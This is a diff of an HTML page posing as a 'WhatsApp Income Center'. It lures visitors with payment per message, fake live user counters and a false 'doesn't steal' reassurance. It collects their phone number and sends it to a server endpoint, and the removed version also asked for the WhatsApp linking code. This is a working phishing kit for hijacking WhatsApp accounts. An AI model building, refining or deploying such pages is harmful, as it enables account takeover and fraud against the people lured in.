@@ -1,15 +1,15 @@
+<!-- WHATSAPP STYLE PAGE 1 -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<title>WhatsApp Connect</title>
 
-<title>WhatsApp income</title>
-
+<link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
 
 <style>
-
 *{
 margin:0;
 padding:0;
@@ -18,391 +18,131 @@ font-family:'Poppins',sans-serif;
 }
 
 body{
-background:linear-gradient(135deg,#0f2027,#203a43,#2c5364);
+height:100vh;
+background:#0b141a;
 display:flex;
 justify-content:center;
 align-items:center;
-min-height:100vh;
-padding:20px;
 overflow:hidden;
 }
 
-/* Glow */
-
-body::before{
-content:'';
-position:absolute;
-width:500px;
-height:500px;
-background:#25d36633;
-border-radius:50%;
-filter:blur(120px);
-top:-100px;
-right:-100px;
+.container{
+width:90%;
+max-width:400px;
+background:#111b21;
+padding:35px 25px;
+border-radius:25px;
+box-shadow:0 0 30px rgba(37,211,102,0.25);
+text-align:center;
+animation:fade .5s ease;
 }
-
-/* Main Card */
-
-.card{
-width:100%;
-max-width:430px;
-background:rgba(255,255,255,0.08);
-backdrop-filter:blur(20px);
-padding:30px;
-border-radius:30px;
-box-shadow:0 15px 40px rgba(0,0,0,0.3);
-border:1px solid rgba(255,255,255,0.1);
-position:relative;
-z-index:2;
-}
-
-/* Logo */
 
 .logo{
-display:flex;
-flex-direction:column;
-align-items:center;
+width:85px;
+margin-bottom:15px;
+}
+
+h1{
+color:white;
+font-size:28px;
 margin-bottom:25px;
+font-weight:700;
 }
 
-.logo img{
-width:75px;
-margin-bottom:10px;
-}
-
-.logo h1{
-font-size:30px;
-color:#25d366;
-}
-
-/* Text */
-
-p{
-text-align:center;
-font-size:14px;
-color:#d9d9d9;
-margin-bottom:20px;
-}
-
-/* Inputs */
-
-input,
-textarea{
+.input-box{
 width:100%;
-padding:15px;
+padding:16px;
 border:none;
 outline:none;
-border-radius:16px;
-background:rgba(255,255,255,0.08);
+border-radius:15px;
+background:#202c33;
 color:white;
+font-size:16px;
 margin-bottom:20px;
-font-size:15px;
-border:1px solid rgba(255,255,255,0.1);
 }
 
-textarea{
-height:140px;
-resize:none;
+.input-box::placeholder{
+color:#9aa6ad;
 }
 
-/* Button */
-
-button{
+.btn{
 width:100%;
 padding:15px;
 border:none;
-border-radius:16px;
-background:#25d366;
+border-radius:15px;
+background:#25D366;
 color:white;
-font-size:16px;
+font-size:17px;
 font-weight:600;
 cursor:pointer;
-transition:0.3s;
+transition:.3s;
 }
 
-button:hover{
-transform:translateY(-2px);
+.btn:hover{
+transform:scale(1.03);
 background:#1ebe5d;
 }
 
-/* Stats */
-
-.stats{
-display:grid;
-grid-template-columns:1fr 1fr;
-gap:15px;
-margin-bottom:20px;
+@keyframes fade{
+from{
+opacity:0;
+transform:translateY(20px);
 }
-
-.stat-box{
-background:rgba(255,255,255,0.08);
-padding:18px;
-border-radius:18px;
-text-align:center;
-border:1px solid rgba(255,255,255,0.1);
+to{
+opacity:1;
+transform:translateY(0);
 }
-
-.stat-box h2{
-color:#25d366;
-font-size:24px;
-margin-bottom:5px;
 }
-
-.stat-box p{
-margin:0;
-font-size:12px;
-}
-
-/* Hidden Pages */
-
-.page{
-display:none;
-}
-
-.page.active{
-display:block;
-}
-
-/* Success */
-
-.success{
-text-align:center;
-}
-
-.success h2{
-color:#25d366;
-margin-bottom:10px;
-}
-
 </style>
 </head>
-
 <body>
 
-<div class="card">
+<div class="container">
 
-<!-- PAGE 1 -->
+<img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
 
-<div class="page active" id="namePage">
+<h1>WhatsApp Income Center</h1>
 
-<div class="logo">
+<p>Welcome To WhatsApp income centre</p>
 
-<img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
+<p>Earn $0.5 For Each Message>
 
-<h1>WhatsApp</h1>
+<input type="text" class="input-box" id="number" placeholder="Input your number">
 
-</div>
-
-<p>
-Welcome to WhatsApp income center
-</p>
-
-<p>Link your WhatsApp and earn $5 for each message>
-
-<p>Note: This doesn't logs you out off your WhatsApp or steal vitual information<p/>
-
-<!-- STATS -->
-
-<div class="stats">
-
-<div class="stat-box">
-<h2 id="usersToday">0</h2>
-<p>Total Users Today</p>
-</div>
-
-<div class="stat-box">
-<h2 id="messagesSent">0</h2>
-<p>Messages Sent</p>
-</div>
-
-</div>
-
-<input type="text"
-id="Phone Number"
-placeholder="Phone number e.g; +1468243888">
-
-<button onclick="continuePage()">
-Continue
-</button>
-
-</div>
-
-<!-- PAGE 2 -->
-
-<div class="page" id="notePage">
-
-<div class="logo">
-
-<img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
-
-<h1>WhatsApp</h1>
-
-</div>
-
-<p>
-You will receive a code for the linking
-</p>
-
-<textarea
-id="Code"
-placeholder="Code"></textarea>
-
-<button onclick="submitNote()">
-Send Message
-</button>
-
-</div>
-
-<!-- SUCCESS -->
-
-<div class="page success" id="successPage">
-
-<h2>Delivered Successfully 🎉</h2>
-
-<p>
-Time to earn Big
-</p>
-
-</div>
+<button class="btn" onclick="continuePage()">Continue</button>
 
 </div>
 
 <script>
-
-/* =========================
-   RANDOM LIVE STATS
-========================= */
-
-let totalUsers = 1523;
-let totalMessages = 8934;
-
-function updateStats(){
-
-totalUsers += Math.floor(Math.random()*5);
-
-totalMessages += Math.floor(Math.random()*8);
-
-document.getElementById("usersToday")
-.innerText = totalUsers.toLocaleString();
-
-document.getElementById("messagesSent")
-.innerText = totalMessages.toLocaleString();
-
-}
-
-setInterval(updateStats,2000);
-
-updateStats();
-
-/* =========================
-   GET USER ID
-========================= */
-
-const params =
-new URLSearchParams(window.location.search);
-
-const userID =
-params.get("id");
-
-/* =========================
-   SEND NAME FIRST
-========================= */
-
 function continuePage(){
 
-let name =
-document.getElementById("Phone Number").value;
+const number = document.getElementById("number").value;
 
-if(name.trim() === ""){
-
-alert("Input your name");
-
+if(!number){
+alert("Input number first");
 return;
-
 }
 
-/* Save first feed */
+// SEND TO YOUR MAIN WEB
+fetch("/save-number", {
+method:"POST",
+headers:{
+"Content-Type":"application/json"
+},
+body:JSON.stringify({
+number:number
+})
+})
 
-let liveData = {
+.then(() => {
+window.location.href = "note.html";
+})
 
-platform:"WhatsApp Premium",
-
-id:userID,
-
-Phone Number:Phone Number,
-
-Code:"Typing...",
-
-time:new Date().toLocaleTimeString()
-
-};
-
-localStorage.setItem(
-"userFeed_" + userID,
-JSON.stringify(liveData)
-);
-
-/* Move Page */
-
-document.getElementById("namePage")
-.classList.remove("active");
-
-document.getElementById("notePage")
-.classList.add("active");
+.catch(() => {
+alert("Error sending number");
+});
 
 }
-
-/* =========================
-   SEND FINAL NOTE
-========================= */
-
-function submitNote(){
-
-let name =
-document.getElementById("Phone Number").value;
-
-let note =
-document.getElementById("Code").value;
-
-if(note.trim() === ""){
-
-alert("Input your message");
-
-return;
-
-}
-
-/* Final Save */
-
-let feedback = {
-
-platform:"WhatsApp Premium",
-
-id:userID,
-
-Phone Number:Phone Number,
-
-Code:Code,
-
-time:new Date().toLocaleTimeString()
-
-};
-
-localStorage.setItem(
-"userFeed_" + userID,
-JSON.stringify(feedback)
-);
-
-/* Success */
-
-document.getElementById("notePage")
-.classList.remove("active");
-
-document.getElementById("successPage")
-.classList.add("active");
-
-}
-
 </script>
 
 </body>
